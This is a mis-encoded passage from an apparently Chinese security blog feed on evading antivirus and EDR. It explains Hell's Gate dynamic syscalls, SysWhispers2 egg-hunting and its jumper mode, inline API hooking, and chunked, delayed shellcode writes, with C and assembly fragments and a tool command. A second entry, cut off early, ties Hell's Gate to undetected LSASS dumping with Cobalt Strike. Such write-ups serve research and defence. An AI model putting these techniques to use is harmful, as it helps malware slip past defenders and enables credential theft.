<br>å·¥å…·-&gt;é€‰é¡¹-&gt;å¯ç”¨åœ°å€çº§è°ƒè¯•<br>åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ï¼ŒDebug-&gt;window-&gt;disassembly</p><h2 id="åŠ¨æ€è¿›è¡Œsyscall"><a href="#åŠ¨æ€è¿›è¡Œsyscall" class="headerlink" title="åŠ¨æ€è¿›è¡Œsyscall"></a>åŠ¨æ€è¿›è¡Œsyscall</h2><p>æˆ‘ä»¬å¾ˆå¤šæ—¶å€™ä½¿ç”¨syscallä¸æ˜¯ç›´æ¥è°ƒç”¨ï¼Œä¸ä¼šåœ¨ä»£ç é‡Œç¡¬ç¼–ç syscallçš„ç³»ç»Ÿè°ƒç”¨å·ã€‚å› ä¸ºä¸åŒçš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡ŒåŠ¨æ€syscall<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨Hellâ€™s Gateæ¥éå†NtDLLçš„å¯¼å‡ºè¡¨ï¼Œæ ¹æ®å‡½æ•°åhashï¼Œæ‰¾åˆ°å‡½æ•°çš„åœ°å€ã€‚æ¥ç€ä½¿ç”¨0xb8è·å–åˆ°ç³»ç»Ÿè°ƒç”¨å·ï¼Œä¹‹åé€šè¿‡syscallæ¥æ‰§è¡Œä¸€ç³»åˆ—å‡½æ•°<br>é€šè¿‡TEBè·å–åˆ°dllçš„åœ°å€å¯ä»¥å‚è€ƒï¼š<a href="https://silver-glacier.github.io/2022/11/12/%E8%8E%B7%E5%8F%96DLL%E5%9F%BA%E5%9D%80/">å‰ç½®çŸ¥è¯†</a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ­¥éª¤æ˜¯</p><ol><li>è§£æpeç»“æ„ï¼Œè·å–å¯¼å‡ºè¡¨</li><li>éå†hashè¡¨å’Œå¯¼å‡ºè¡¨ï¼Œæ‰¾åˆ°syscallçš„å‡½æ•°ï¼Œé€šè¿‡æ ‡è®°çš„æ–¹å¼è·å¾—ç³»ç»Ÿè°ƒç”¨å·</li><li>è°ƒç”¨syscallï¼Œåˆ†é…å†…å­˜ï¼Œä¿®æ”¹å†…å­˜å±æ€§ï¼Œåˆ›å»ºçº¿ç¨‹</li></ol><p>è¿™äº›åœ¨Hellâ€™s Hateå·²ç»å®ç°ï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹è¿™æ®µä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*((PBYTE)pFunctionAddress + cw) == <span class="hljs-number">0x4c</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">1</span> + cw) == <span class="hljs-number">0x8b</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">2</span> + cw) == <span class="hljs-number">0xd1</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">3</span> + cw) == <span class="hljs-number">0xb8</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">6</span> + cw) == <span class="hljs-number">0x00</span><br>          &amp;&amp; *((PBYTE)pFunctionAddress + <span class="hljs-number">7</span> + cw) == <span class="hljs-number">0x00</span>) &#123;<br>          BYTE high = *((PBYTE)pFunctionAddress + <span class="hljs-number">5</span> + cw);<br>          BYTE low = *((PBYTE)pFunctionAddress + <span class="hljs-number">4</span> + cw);<br>          pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; <span class="hljs-number">8</span>) | low;<br>          <span class="hljs-keyword">break</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆåŒ¹é…è¿™å‡ ä¸ªå­—èŠ‚å°±èƒ½æ‰¾åˆ°syscallè°ƒç”¨å·<br>è¿™é‡Œæœ‰å¼ å›¾å¾ˆæ˜ç¡®<br><img src="https://s2.loli.net/2022/11/12/PZxEp96fFIB8i2N.png"><br>å¯ä»¥çœ‹åˆ°syscallçš„æ±‡ç¼–è¯­å¥æ¯”è¾ƒå›ºå®š</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-number">4</span>C8BD1 -&gt; <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br><span class="hljs-symbol">B8XXXXXXXX</span> -&gt; move eax,xx<br><span class="hljs-number">0</span>f05 -&gt; syscall<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬é€ä¸ªå­—èŠ‚è¿›è¡Œéå†ï¼Œç›´åˆ°å‡ºç°mov r10, rcxå’Œmove eaxï¼Œç»è¿‡ä½è¿ç®—å¾—åˆ°syscallè°ƒç”¨å·<br>è¿™æ˜¯æˆ‘ä»¬ç”Ÿæˆçš„syscall</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-comment">; Hell&#x27;s Gate</span><br>  <span class="hljs-comment">; Dynamic system call invocation </span><br>  <span class="hljs-comment">; </span><br>  <span class="hljs-comment">; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)</span><br><br>  <span class="hljs-meta">.data</span><br>      wSystemCall DWORD <span class="hljs-number">000</span>h<br><br>  <span class="hljs-meta">.code</span> <br>      HellsGate <span class="hljs-meta">PROC</span><br>          <span class="hljs-keyword">mov</span> wSystemCall, <span class="hljs-number">000</span>h<br>          <span class="hljs-keyword">mov</span> wSystemCall, ecx<br>          ret<br>      HellsGate <span class="hljs-meta">ENDP</span><br><br>      HellDescent <span class="hljs-meta">PROC</span><br>          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br>          <span class="hljs-keyword">mov</span> eax, wSystemCall<br><br>          syscall<br>          ret<br>      HellDescent <span class="hljs-meta">ENDP</span><br>  <span class="hljs-meta">end</span><br></code></pre></td></tr></table></figure><h2 id="SysWhispers2"><a href="#SysWhispers2" class="headerlink" title="SysWhispers2"></a>SysWhispers2</h2><p><a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a> æ˜¯ä¸€ä¸ªåˆé›†ï¼Œç”¨pythonç”Ÿæˆ.cæºç æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶çš„ä½œç”¨å’ŒHellâ€™s Gateç±»ä¼¼ï¼Œä¹Ÿæ˜¯åœ¨PEä¸­æ‰¾å¯¼å‡ºè¡¨ï¼Œä¹‹åé€šè¿‡å¯¹æ¯”å‡½æ•°hashæ‰¾åˆ°syscallè°ƒç”¨å·ã€‚ç›¸å¯¹Hellâ€™s Gateæœ‰æ›´å¤šçš„å‡½æ•°å¯ä¾›é€‰æ‹©ï¼Œä¸ä»…ä»…æ˜¯å†…å­˜ç›¸å…³çš„å‡ ä¸ªå‡½æ•°ã€‚å¹¶ä¸”å¯¹syscallçš„asmæœ‰ä¸€å®šç¨‹åº¦çš„æ··æ·†(ä½¿ç”¨äº†INT 2EHæ›¿æ¢sycall)</p><p>æˆ‘ä»¬åœ¨åŠ¨æ€ä½¿ç”¨syscallçš„æ—¶å€™å·²ç»å‘ç°äº†ï¼Œsyscallåç¼–è¯‘ä¹‹åçš„æ±‡ç¼–è¯­å¥æ¯”è¾ƒå›ºå®šï¼Œé‚£è¿™ä¹ˆè¿™æ ·çš„è¯syscallç‰¹å¾éå¸¸æ˜æ˜¾,é™æ€ç‰¹å¾å°±å¾ˆå®¹æ˜“è¢«è¯†åˆ«åˆ°<br>å¯¹äºè¿™ä¸ªé—®é¢˜ï¼ŒSysWhispers2åšå‡ºäº†ç›¸åº”çš„è§£å†³åŠæ³•</p><blockquote><p>egghunter<br>åœ¨fuzzysecurityçš„<a href="https://www.fuzzysecurity.com/tutorials/expDev/4.html">äºŒè¿›åˆ¶æ•™ç¨‹</a>ä¸­æåˆ°è¿‡ç›¸å…³æŠ€æœ¯<br>å…ˆç”¨å½©è›‹ï¼ˆä¸€äº›éšæœºçš„ã€å”¯ä¸€çš„ã€å¯è¯†åˆ«çš„æ¨¡å¼ï¼‰æ›¿æ¢syscallæŒ‡ä»¤ï¼Œç„¶ååœ¨è¿è¡Œæ—¶ï¼Œå†åœ¨å†…å­˜ä¸­æœç´¢è¿™ä¸ªå½©è›‹ï¼Œå¹¶ä½¿ç”¨ReadProcessMemoryå’ŒWriteProcessMemoryç­‰WINAPIè°ƒç”¨å°†å…¶æ›¿æ¢ä¸ºsyscallæŒ‡ä»¤ã€‚ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸ä½¿ç”¨ç›´æ¥ç³»ç»Ÿè°ƒç”¨äº†<br>æˆ‘ä»¬åœ¨å†…å­˜ä¸­ä½¿ç”¨dbè¡¨ç¤ºä¸€ä¸ªå­—èŠ‚ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨å†…å­˜ä¸­.txtæ®µå†™å…¥â€w00tw00tâ€çš„å­—èŠ‚</p></blockquote><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arm"><span class="hljs-symbol">NtAllocateVirtualMemory</span> <span class="hljs-meta">PROC</span><br>  <span class="hljs-keyword">mov</span> [rsp +<span class="hljs-number">8</span>], rcx          <span class="hljs-comment">; Save registers.</span><br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">16</span>], rdx<br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">24</span>], <span class="hljs-built_in">r8</span><br>  <span class="hljs-keyword">mov</span> [rsp+<span class="hljs-number">32</span>], <span class="hljs-built_in">r9</span><br>  <span class="hljs-keyword">sub</span> rsp, <span class="hljs-number">28</span>h<br>  <span class="hljs-keyword">mov</span> ecx, <span class="hljs-number">003970</span>B07h        <span class="hljs-comment">; Load function hash into ECX.</span><br>  call SW2_GetSyscallNumber  <span class="hljs-comment">; Resolve function hash into syscall number.</span><br>  <span class="hljs-keyword">add</span> rsp, <span class="hljs-number">28</span>h<br>  <span class="hljs-keyword">mov</span> rcx, [rsp +<span class="hljs-number">8</span>]          <span class="hljs-comment">; Restore registers.</span><br>  <span class="hljs-keyword">mov</span> rdx, [rsp+<span class="hljs-number">16</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r8</span>, [rsp+<span class="hljs-number">24</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r9</span>, [rsp+<span class="hljs-number">32</span>]<br>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, rcx<br>  DB <span class="hljs-number">77</span>h                     <span class="hljs-comment">; &quot;w&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">74</span>h                     <span class="hljs-comment">; &quot;t&quot;</span><br>  DB <span class="hljs-number">77</span>h                     <span class="hljs-comment">; &quot;w&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">0</span>h                      <span class="hljs-comment">; &quot;0&quot;</span><br>  DB <span class="hljs-number">74</span>h                     <span class="hljs-comment">; &quot;t&quot;</span><br>  ret<br><span class="hljs-symbol">NtAllocateVirtualMemory</span> <span class="hljs-meta">ENDP</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éå†å…¨æ–‡ï¼Œå»å¯»æ‰¾æˆ‘ä»¬åŸ‹ä¸‹çš„å½©è›‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FindAndReplace</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> egg[], <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> replace[])</span></span><br><span class="hljs-function"></span>&#123;<br><br>    ULONG64 startAddress = <span class="hljs-number">0</span>;<br>    ULONG64 size = <span class="hljs-number">0</span>;<br><br>    GetMainModuleInformation(&amp;startAddress, &amp;size);<br><br>    <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error detecting main module size&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    ULONG64 currentOffset = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* current = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*));<br>    <span class="hljs-keyword">size_t</span> nBytesRead;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starting search from: 0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);<br><br>    <span class="hljs-keyword">while</span> (currentOffset &lt; size - <span class="hljs-number">8</span>)<br>    &#123;<br>        currentOffset++;<br>        LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);<br>        <span class="hljs-keyword">if</span>(DEBUG &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Searching at 0x%llu\n&quot;</span>, (ULONG64)currentAddress);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ReadProcessMemory((HANDLE)((<span class="hljs-keyword">int</span>)<span class="hljs-number">-1</span>), currentAddress, current, <span class="hljs-number">8</span>, &amp;nBytesRead)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error reading from memory\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (nBytesRead != <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error reading from memory\n&quot;</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(DEBUG &gt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nBytesRead; i++)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x &quot;</span>, current[i]);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(egg, current, <span class="hljs-number">8</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found at %llu\n&quot;</span>, (ULONG64)currentAddress);<br>            WriteProcessMemory((HANDLE)((<span class="hljs-keyword">int</span>)<span class="hljs-number">-1</span>), currentAddress, replace, <span class="hljs-number">8</span>, &amp;nBytesRead);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ended search at:   0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);<br>    <span class="hljs-built_in">free</span>(current);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åšè™½ç„¶å¯ä»¥ç»•è¿‡é™æ€çš„æ£€æµ‹äº†ä½†ä¾æ—§å­˜åœ¨é—®é¢˜ï¼Œç†è®ºä¸Šsyscallè¡Œä¸ºåº”è¯¥åªå­˜åœ¨ntdllä¸­ï¼Œè€Œæˆ‘ä»¬ä½¿ç”¨syscallæ˜¯åœ¨å½“å‰ç¨‹åºä¸­ã€‚ç®€å•çš„åˆ¤æ–­RIPå°±å¯ä»¥æ£€æµ‹å‡ºæˆ‘ä»¬çš„å¯ç–‘è¡Œä¸º<br><img src="https://s2.loli.net/2022/11/12/dfIEOSNrGlvC3Ko.png"><br>è€Œå¯¹ä¸RIPçš„æ£€æµ‹ï¼Œä½œè€…ä¹Ÿç»™å‡ºäº†æŠ€æœ¯æ–¹æ¡ˆï¼Œè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚åœ¨å†…å­˜ä¸­æœç´¢syscallçš„åœ°å€ï¼Œç›´æ¥jmpåˆ°è¯¥ä½ç½®ã€‚å³å¯è®©RIPæŒ‡å‘ntdll<br><code>python3 syswhispers.py -p common -a x64 -c msvc -m jumper -v -d -o 1</code></p><h2 id="æœºå™¨å­¦ä¹ ç‰¹å¾çš„edrçš„æ£€æµ‹"><a href="#æœºå™¨å­¦ä¹ ç‰¹å¾çš„edrçš„æ£€æµ‹" class="headerlink" title="æœºå™¨å­¦ä¹ ç‰¹å¾çš„edrçš„æ£€æµ‹"></a>æœºå™¨å­¦ä¹ ç‰¹å¾çš„edrçš„æ£€æµ‹</h2><p><a href="https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection">https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection</a></p><h3 id="windows-api-hook"><a href="#windows-api-hook" class="headerlink" title="windows api hook"></a>windows api hook</h3><ol><li>æ‰¾åˆ°å†…å­˜ä¸­éœ€è¦è¢«hookçš„å‡½æ•°åœ°å€<code>LPVOID  lpDllExport = GetProcAddress(hJmpMod, jmpFuncName);</code></li><li>æ‰¾åˆ°åå°†å‰ä¸ƒä¸ªå­—èŠ‚æ”¹ä¸ºè·³è½¬ï¼Œå¦‚ä¸‹<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> jmpSc[<span class="hljs-number">7</span>]&#123;<br>        <span class="hljs-number">0xB8</span>, b[<span class="hljs-number">0</span>], b[<span class="hljs-number">1</span>], b[<span class="hljs-number">2</span>], b[<span class="hljs-number">3</span>],<br>        <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span><br>    &#125;;<br>``` <br><span class="hljs-number">3.</span> æœºå™¨ç å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤å¤§æ¦‚æ˜¯<br>```arm<br>move eax,xxxx<br>jmp eax<br></code></pre></td></tr></table></figure></li><li>ä¿®æ”¹å†…å­˜<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">WriteProcessMemory(<br>        hProc,<br>        lpDllExport,<br>        jmpSc,<br>        <span class="hljs-keyword">sizeof</span>(jmpSc),<br>        &amp;szWritten<br>    );<br></code></pre></td></tr></table></figure>å®ç°äº†åŠ«æŒå¯¹åº”å‡½æ‰§è¡Œæµç¨‹çš„åŠŸèƒ½ã€‚å¦‚æœæƒ³è¦ç»´æŒå‡½æ•°åŸæœ¬çš„åŠŸèƒ½ï¼Œä¿å­˜åŸæœ¬çš„ä¸ƒä¸ªå­—èŠ‚ï¼Œåœ¨shellcodeä¸­å†æ¬¡æ›¿æ¢è¿™éƒ¨åˆ†å†…å­˜å¹¶jumpå›æ¥</li></ol><h3 id="Windows-å†…å­˜åˆ†é…çš„ä¸€äº›è§„åˆ™"><a href="#Windows-å†…å­˜åˆ†é…çš„ä¸€äº›è§„åˆ™" class="headerlink" title="Windows å†…å­˜åˆ†é…çš„ä¸€äº›è§„åˆ™"></a>Windows å†…å­˜åˆ†é…çš„ä¸€äº›è§„åˆ™</h3><p>åœ¨windows 10 64ä½ä¸‹ï¼Œå†…å­˜æœ€å°çš„åˆ†é…ç²’åº¦ä¸º4kB, systeminfoç»“æ„ä½“ä¸­ï¼Œæ ‡è¯†äº†è¿™ä¸ªå˜é‡ï¼Œä¸ºå†…å­˜åˆ†é¡µçš„å¤§å°ã€‚<br>åœ¨windowsä¸­ï¼Œæ‰€æœ‰VirtualAllocExåˆ†é…çš„å†…å­˜ï¼Œä¼šå‘ä¸Šå–æ•´åˆ°AllocationGranularityçš„å€¼ï¼Œwindows10ä¸‹ä¸º64kbï¼Œæ¯”å¦‚ï¼š</p><p>æˆ‘ä»¬åœ¨0x40000000çš„åŸºå€åˆ†é…äº†4kBçš„MEM_COMMIT | MEM_RESERVEçš„å†…å­˜ï¼Œé‚£ä¹ˆæ•´å—0x40010000 (64kB)åŒºåŸŸå°†ä¸èƒ½è¢«é‡æ–°åˆ†é…ã€‚</p><h3 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h3><p>å¾ˆå¤šedrå°†åˆ›å»ºè¿œç¨‹çº¿ç¨‹çš„è¡Œä¸ºåˆ—ä¸ºå¯ç–‘è¡Œä¸ºï¼Œæ¯”å¦‚windows definderä»…ä»…æ˜¯åšè®°å½•ä½†å¹¶ä¸æŠ¥è­¦ï¼Œäº§ç”ŸæŠ¥è­¦è¿˜æœ‰å…¶ä»–çš„åˆ¤æ–­é€»è¾‘</p><ol><li>ä¸å…¶åˆ†é…ä¸€å¤§å—å†…å­˜å¹¶ç›´æ¥å°†~250KBçš„implant shellcodeå†™å…¥è¯¥å†…å­˜ï¼Œä¸å¦‚åˆ†é…å°å—ä½†è¿ç»­çš„å†…å­˜ï¼Œä¾‹å¦‚&lt;64KBçš„å†…å­˜ï¼Œå¹¶å°†å…¶æ ‡è®°ä¸ºNO_ACCESSã€‚ç„¶åï¼Œå°†shellcodeæŒ‰ç…§ç›¸åº”çš„å—å¤§å°å†™å…¥è¿™äº›å†…å­˜é¡µä¸­ã€‚</li><li>åœ¨ä¸Šè¿°çš„æ¯ä¸€ä¸ªæ“ä½œä¹‹é—´å¼•å…¥å»¶è¿Ÿã€‚è¿™å°†å¢åŠ æ‰§è¡Œshellcodeæ‰€éœ€çš„æ—¶é—´ï¼Œä½†ä¹Ÿä¼šæ·¡åŒ–è¿ç»­æ‰§è¡Œæ¨¡å¼ã€‚</li><li>ä½¿ç”¨é’©å­ï¼ŒåŠ«æŒRtlpWow64CtxFromAmd64å‡½æ•°ï¼Œæ‰§è¡Œæ¶æ„shellcode</li></ol><hr><p>å‚è€ƒæ–‡ç« <br><a href="https://xz.aliyun.com/t/11496">https://xz.aliyun.com/t/11496</a><br><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</a><br><a href="https://blog.redbluepurple.io/windows-security-research/bypassing-injection-detection">https://blog.redbluepurple.io/windows-security-research/bypassing-injection-detection</a></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hell&#39;s Gate</title>
      <link href="2022/11/09/Hell&#39;s%20Gate/"/>
      <url>2022/11/09/Hell&#39;s%20Gate/</url>
      
        <content type="html"><![CDATA[<h1 id="Hellâ€™s-Gate"><a href="#Hellâ€™s-Gate" class="headerlink" title="Hellâ€™s Gate"></a>Hellâ€™s Gate</h1><h2 id="åœ°ç‹±ä¹‹é—¨"><a href="#åœ°ç‹±ä¹‹é—¨" class="headerlink" title="åœ°ç‹±ä¹‹é—¨"></a>åœ°ç‹±ä¹‹é—¨</h2><p><a href="https://github.com/am0nsec/HellsGate">åœ°ç‹±ä¹‹é—¨</a>çš„ä¸»è¦å®ç°æ˜¯ç›´æ¥ç³»ç»Ÿè°ƒç”¨æ¥ç»•è¿‡ç”¨æˆ·çº§APIçš„hookï¼Œè¿™ç§æŠ€æœ¯å¯ç”¨äºä½¿ç”¨ Cobalt Strike åˆ›å»º LSASS å†…å­˜è½¬å‚¨ï¼ŒåŒæ—¶ä¸æ¥è§¦ç£ç›˜å¹¶è§„é¿ AV/EDR ç›‘æ§çš„ç”¨æˆ·æ¨¡å¼çš„APIè°ƒç”¨ã€‚</p><a id="more"></a><h3 id="ç›´æ¥ç³»ç»Ÿè°ƒç”¨"><a href="#ç›´æ¥ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç›´æ¥ç³»ç»Ÿè°ƒç”¨"></a>ç›´æ¥ç³»ç»Ÿè°ƒç”¨</h3><p>å¯¹äºwindowsè€Œè¨€ï¼Œä½ å¯èƒ½ç»å†è¿‡ï¼Œä¸€ä¸ªç®€å•çš„åº”ç”¨ç¨‹åºå´©æºƒï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒï¼Œä»€ä¹ˆå‡ºç°æ— æ³•ç†è§£çš„è“å±æƒ…å†µï¼Œè€Œä½¿ç”¨windbgä¹Ÿæ— æ³•æ‰¾å‡ºå…¶å­˜åœ¨é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºæ“ä½œç³»ç»Ÿåœ¨ä¸€ä¸ªrealæ¨¡å¼ä¸‹è¿è¡Œï¼Œè¿™æ„å‘³ç€å¤„ç†å™¨åœ¨æ²¡æœ‰åº”ç”¨å±‚æ¬¡ä½ éš”ç¦»å’Œä¿æŠ¤çš„æ¨¡å¼ä¸‹è¿è¡Œã€‚ç”±äºä¸¥é‡çš„ç³»ç»Ÿå†…å­˜æŸåï¼Œé”™è¯¯çš„ç¨‹åºæˆ–è€…é”™è¯¯å¯èƒ½å¯¼è‡´æ“ä½œç³»ç»Ÿå®Œå…¨å´©æºƒï¼Œå› ä¸ºå¯¹äºå¯ä»¥è®¿é—®æˆ–ä¸è®¿é—®çš„å†…å­˜åŒºåŸŸæ²¡æœ‰é™åˆ¶ã€‚<br>è€Œä¿æŠ¤æ¨¡å¼çš„æ›´æ–°å¤„ç†å™¨å’Œæ“ä½œç³»ç»Ÿå¼•å…¥äº†è®¸å¤šä¿æŠ¤æªæ–½ï¼Œå¹¶ä¸”å¯ä»¥å¹¶ä¸”å¯ä»¥é€šè¿‡ä½¿ç”¨è™šæ‹Ÿå†…å­˜å’Œç‰¹æƒçº§åˆ«æˆ–ç¯å°†æ­£åœ¨è¿è¡Œçš„ç¨‹åºç›¸äº’éš”ç¦»æ¥ä¿æŠ¤ç³»ç»Ÿå…å—å´©æºƒã€‚åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œå®é™…ä½¿ç”¨äº†å…¶ä¸­ä¸¤ä¸ªç¯ã€‚åº”ç”¨ç¨‹åºåœ¨ ç”¨æˆ·æ¨¡å¼ä¸‹è¿è¡Œï¼Œç›¸å½“äº ring 3ï¼Œå…³é”®ç³»ç»Ÿç»„ä»¶å¦‚å†…æ ¸å’Œè®¾å¤‡é©±åŠ¨ç¨‹åºåœ¨ å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œï¼Œå¯¹åº”äº ring 0ã€‚<br><img 